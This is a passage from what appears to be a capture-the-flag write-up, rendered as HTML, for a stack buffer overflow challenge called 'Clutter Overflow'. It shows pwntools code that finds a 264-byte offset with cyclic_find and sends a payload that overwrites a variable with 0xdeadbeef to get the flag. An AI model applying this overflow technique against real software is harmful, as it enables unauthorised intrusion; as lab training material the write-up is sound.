d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_i9w9" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div><p>I receive until the line that gives me the hex value of 'code' and convert it into an integer.</p><div class="codeBlockContainer_I0IT language-python theme-code-block"><div class="codeBlockContent_wNvx" style="color:#393A34;background-color:#f6f8fa"><pre tabindex="0" class="prism-code language-python codeBlock_jd64 thin-scrollbar"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#393A34"><span class="token plain">io</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">recvuntil</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">b'code == 0x'</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" title="Copy" class="copyButton_eDfN clean-btn"><span class="copyButtonIcons_W9eQ" aria-hidden="true"><svg class="copyButtonIcon_XEyF" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_i9w9" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div><div class="codeBlockContainer_I0IT language-python theme-code-block"><div class="codeBlockContent_wNvx" style="color:#393A34;background-color:#f6f8fa"><pre tabindex="0" class="prism-code language-python codeBlock_jd64 thin-scrollbar"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#393A34"><span class="token plain">code </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> io</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">recvline</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ints </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token builtin">int</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">code</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">decode</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> base</span><span class="token operator" style="color:#393A34">=</span><span class="token number" style="color:#36acaa">16</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" title="Copy" class="copyButton_eDfN clean-btn"><span class="copyButtonIcons_W9eQ" aria-hidden="true"><svg class="copyButtonIcon_XEyF" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_i9w9" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div><p>I print the value of ints and get '7089054359331365225' as the value.</p><p>I search for this as the sebsequence of cyclic_find and store it in 'offset'.</p><div class="codeBlockContainer_I0IT language-python theme-code-block"><div class="codeBlockContent_wNvx" style="color:#393A34;background-color:#f6f8fa"><pre tabindex="0" class="prism-code language-python codeBlock_jd64 thin-scrollbar"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#393A34"><span class="token plain">offset </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> cyclic_find</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">ints</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">8</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" title="Copy" class="copyButton_eDfN clean-btn"><span class="copyButtonIcons_W9eQ" aria-hidden="true"><svg class="copyButtonIcon_XEyF" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_i9w9" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div><p>The value of offset turns out to be 264 so 'code' is 264 bytes away from 'clutter' on the stack. Knowing this, I can now send the value 0xdeadbeef after the offset using the fit command.</p><div class="codeBlockContainer_I0IT language-python theme-code-block"><div class="codeBlockContent_wNvx" style="color:#393A34;background-color:#f6f8fa"><pre tabindex="0" class="prism-code language-python codeBlock_jd64 thin-scrollbar"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#393A34"><span class="token plain">payload </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> fit</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    offset</span><span class="token punctuation" style="color:#393A34">:</span><span class="token number" style="color:#36acaa">0xdeadbeef</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" title="Copy" class="copyButton_eDfN clean-btn"><span class="copyButtonIcons_W9eQ" aria-hidden="true"><svg class="copyButtonIcon_XEyF" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_i9w9" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div><p>The payload ends up as b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaac\xef\xbe\xad\xde\x00\x00\x00\x00'</p><p>I then send the payload to the server.</p><div class="codeBlockContainer_I0IT language-python theme-code-block"><div class="codeBlockContent_wNvx" style="color:#393A34;background-color:#f6f8fa"><pre tabindex="0" class="prism-code language-python codeBlock_jd64 thin-scrollbar"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#393A34"><span class="token plain">io</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">sendlineafter</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">b"What do you see?"</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> payload</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" title="Copy" class="copyButton_eDfN clean-btn"><span class="copyButtonIcons_W9eQ" aria-hidden="true"><svg class="copyButtonIcon_XEyF" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_i9w9" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div><p>The output matches as expected and I get the flag.</p><p><img loading="lazy" alt="Clutter Overflow Flag" src="data:image/png;base64,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